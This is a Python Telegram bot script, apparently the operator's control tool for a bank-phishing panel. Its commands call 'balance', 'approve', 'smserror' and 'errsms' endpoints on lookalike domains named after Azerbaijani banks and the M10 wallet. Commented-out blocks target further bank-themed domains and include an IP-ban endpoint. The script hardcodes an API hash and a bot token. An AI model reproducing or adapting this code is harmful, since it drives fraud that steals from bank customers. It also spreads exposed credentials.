import os
import requests
from pyrogram import Client, filters




API_ID = 21220128
API_HASH = "12c6fb5b2392354054cde4c3f338fa6a"
BOT_TOKEN = "6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik"



app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# @app.on_message(filters.command(["k"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asancerime.com/crud/kapital/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /kapital command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
# @app.on_message(filters.command(["la"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asancerime.com/crud/abb/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("/la id ")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
@app.on_message(filters.command(["p"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://leokartbonus.com/crud/err/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /leobank command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
@app.on_message(filters.command(["s"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://leokartbonus.com/crud/errsms/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /leobank command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
            
            
            
            
##### M10------
@app.on_message(filters.command(["b"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]

        url = f"https://m10aile.com/crud/balance/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /n command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")



@app.on_message(filters.command(["a"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]

        url = f"https://m10aile.com/crud/approve/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /a command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")



@app.on_message(filters.command(["e"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://m10aile.com/crud/smserror/{number}/"
        response = requests.get(url)
        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /e command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")      



               

# @app.on_message(filters.command(["u"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/unibank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /unibank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
# @app.on_message(filters.command(["se"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/smserror/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /se command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        


# @app.on_message(filters.command(["sf"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/smsfix/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /smsfix command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")



# @app.on_message(filters.command(["p"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/pashabank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /pashabank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")




# @app.on_message(filters.command(["error"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/error/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /error command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
        
# @app.on_message(filters.command(["ip"]))
# def kapital(client, message):
#     try:
#         ip = message.text.split()[1]
#         url = f"https://asanodenis.net/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
#         data = {
#             "ip_address": f"{ip}",
#             "ban_reason": ""
#         }
#         response = requests.post(url,data=data)
#         print(response.text)
#         if response.status_code == 200:
#             message.reply_text(f"Ip uğurla banladı :)\nip:{ip}.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Ip Yazin /ip command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        

app.run()